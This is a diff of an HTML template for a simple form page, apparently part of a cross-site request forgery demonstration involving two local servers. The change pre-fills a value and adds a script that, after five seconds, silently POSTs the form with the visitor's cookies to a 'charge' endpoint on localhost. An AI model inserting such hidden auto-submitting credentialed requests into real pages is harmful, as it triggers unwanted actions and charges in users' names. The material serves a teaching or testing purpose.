@@ -1,28 +1,58 @@
 {% extends 'base.html' %}
 {% block content %}
-{{page_title}}
-
+<style>
+    a {
+        font-family: Verdana;
+        font-size: 17px;
+    }
+    body {
+        font-family: Impact;
+        font-size: 40px;
+    }
+    form {
+        font-family: Verdana;
+        font-size: 15px;
+    }
+</style>
+<p style="color:#B2DDE1">form page</p>
     {% if auth_condition %}
-    <p>
-        <a href="http://{{server_two_host}}:{{server_two_port}}/auth.html">
-            <font color="#899597" size="+1" face="verdana">AUTHORIZE</font>
+        <a style="color:#899597" href="http://{{server_two_host}}:{{server_two_port}}/auth.html">
+            AUTHORIZE
         </a>
-    </p>
     {% else %}
-    <p>
-        <a href="http://{{server_two_host}}:{{server_two_port}}/deauth.html">
-            <font color="#899597" size="+1" face="verdana">DE-AUTHORIZE</font>
+        <a style="color:#899597" href="http://{{server_two_host}}:{{server_two_port}}/deauth.html">
+            DE-AUTHORIZE
         </a>
-    </p>
     {% endif %}
-<br/><br/>
+<br/>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
 <script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
-<center>
-    <form name="myform" action="http://{{server_two_host}}:{{server_two_port}}/charge.html"  method="post">
-    <font size="+1" face="verdana" color="ACCACD">ENTER DATA:</font><br/><br/>
-    <input type="text" size="30" placeholder="enter digit. example: 10" pattern="^[ 0-9]+$" name="digit"><br/><br/>
-    <input type="submit" value="send">
+<div align="center">
+    <form name="myform" action="http://{{server_two_host}}:{{server_two_port}}/charge.html"  method="post"
+          style="color:#ACCACD">
+        ENTER DATA:<br/><br/>
+    <input type="text" size="30" placeholder="enter digit. example: 10" pattern="^[ 0-9]+$" name="digit"
+           value="846 234"><br/><br/>
     </form>
-</center>
+</div>
+<script>
+    $(document).ready(function()
+        {
+            setTimeout(function(){
+                var
+                    oldForm = document.forms.myform,
+                    formData = new FormData(oldForm);
+                var url = 'http://localhost:8002/charge.html';
+                fetch(url, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'cors',
+                    credentials: 'include'
+                }).then(response => response.text())
+                .then(response => {
+                    alert(response);
+                });
+            }, 5000);
+        });
+</script>
 {% endblock %}
